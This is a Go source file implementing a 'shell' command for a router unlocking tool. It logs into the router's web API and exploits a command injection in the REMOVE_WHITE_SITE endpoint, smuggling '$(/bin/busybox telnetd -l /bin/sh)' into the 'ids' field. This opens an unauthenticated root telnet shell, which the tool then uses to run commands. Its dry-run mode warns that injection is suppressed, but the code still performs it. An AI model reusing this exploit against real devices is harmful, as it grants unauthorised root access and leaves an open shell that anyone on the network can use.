package cmd

import (
	"fmt"
	"strings"
	"time"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/anusara-bemal/zlt-unlocker/internal/profile"
	"github.com/anusara-bemal/zlt-unlocker/internal/telnet"
	"github.com/anusara-bemal/zlt-unlocker/pkg/netutil"
)

var (
	shellCommand string
	shellAT      bool
)

// ensureShell opens a root shell on the router, enabling telnet through the
// REMOVE_WHITE_SITE injection if port 23 is closed.
func ensureShell() (*telnet.Client, error) {
	// The injection endpoint requires an authenticated session even when
	// telnet is already running. Login is best-effort: some firmware builds
	// reject a second login while a session is active, which is harmless.
	if err := app.API.Login(app.Profile.Login.Username, app.Profile.Login.Password); err != nil {
		log.WithError(err).Warn("[shell] login failed; continuing with existing session")
	}

	if !netutil.ScanPort(app.Target, 23, app.Timeout) {
		log.Info("[shell] telnet closed; enabling via injection")
		r := app.API.Try(profile.Payload{
			ID: "REMOVE_WHITE_SITE", Method: "POST",
			Args: map[string]string{
				"isTest": "false",
				"ids":    "1 $(/bin/busybox telnetd -l /bin/sh)",
			},
		})
		if r.Err != nil {
			return nil, fmt.Errorf("enable telnet: %w", r.Err)
		}
		for i := 0; i < 20; i++ {
			if netutil.ScanPort(app.Target, 23, app.Timeout) {
				break
			}
			time.Sleep(200 * time.Millisecond)
		}
	}
	if !netutil.ScanPort(app.Target, 23, app.Timeout) {
		return nil, fmt.Errorf("telnet is not available on %s:23", app.Target)
	}
	return telnet.Dial(app.Target, 23, 3*time.Second)
}

var shellCmd = &cobra.Command{
	Use:   "shell",
	Short: "Open an interactive root shell (or run a single command)",
	Long: `Opens a root shell on the router over telnet. If telnet is closed,
it is enabled first using the REMOVE_WHITE_SITE command injection.

Use --command to run one command non-interactively, and --at to send a raw
AT command to the modem instead of a shell command.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if app.DryRun {
			log.Warn("DRY-RUN: telnet injection is suppressed; connecting only if already open")
		}

		client, err := ensureShell()
		if err != nil {
			return err
		}
		defer client.Close()

		_, _ = client.Expect("# ", 3*time.Second)

		if shellCommand == "" {
			fmt.Println("Connected. Type 'exit' to leave.")
			return client.Interactive()
		}

		command := shellCommand
		if shellAT {
			// The firmware ships /bin/at_cmd for modem AT commands.
			command = "at_cmd " + shellCommand
		}
		out, err := client.Run(command, "# ", 8*time.Second)
		if err != nil {
			return err
		}
		fmt.Print(strings.TrimSpace(out))
		fmt.Println()
		return nil
	},
}

func init() {
	shellCmd.Flags().StringVar(&shellCommand, "command", "", "run a single command instead of opening a shell")
	shellCmd.Flags().BoolVar(&shellAT, "at", false, "treat --command as a raw AT command")
	rootCmd.AddCommand(shellCmd)
}
